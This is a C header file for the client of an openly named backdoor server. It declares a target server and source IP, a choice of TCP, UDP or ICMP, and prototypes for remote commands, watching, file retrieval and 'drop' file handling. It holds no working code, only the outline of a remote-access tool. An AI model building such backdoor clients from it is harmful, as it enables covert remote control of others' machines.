/*-----------------------------------------------------------------------------
 * client.h - Client to Backdoor Server
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#ifndef CLIENT_H
#define CLIENT_H

#include "common.h"

#include <getopt.h>

/* error codes */
#define ERROR_OPTS		-1
#define	ERROR_OPTS_HELP	-2

/* defaults */
#define PROTO_TCP	1
#define PROTO_UDP	2
#define PROTO_ICMP	3

/* globals */
struct cli_vars {
	char *server_ip;
	char *source_ip;
	int protocol;
} cli_vars;

/* function prototypes */
void print_settings(char *);
void print_usage(char *, int);
int parse_options(int, char **);
void cli_interface(void);
void cli_command(void);
void cli_watch(void);
void cli_getfile(void);
void cli_dropget(void);
void cli_dropdel(void);
void cli_help(void);

#endif
